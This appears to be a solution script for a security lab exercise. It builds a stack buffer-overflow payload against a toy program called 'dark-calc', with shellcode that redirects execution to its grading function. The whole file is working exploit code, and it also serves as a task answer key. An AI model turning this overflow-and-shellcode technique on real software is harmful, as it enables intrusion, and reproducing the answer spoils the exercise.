#!/usr/bin/env python3
"""Task 2: execute shellcode on dark-calc's fixed executable stack."""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


BUFFER_ADDRESS = 0x721000800FD0
GRADE_EVAL = 0x401A87

shellcode = bytes.fromhex(
    "bf 04 00 00 00 "
    "68 87 1a 40 00 "
    "c3"
)

payload = (
    shellcode
    + b"\x90" * 5
    + b"B" * 8
    + p64(BUFFER_ADDRESS)
)

sys.stdout.buffer.write(payload)
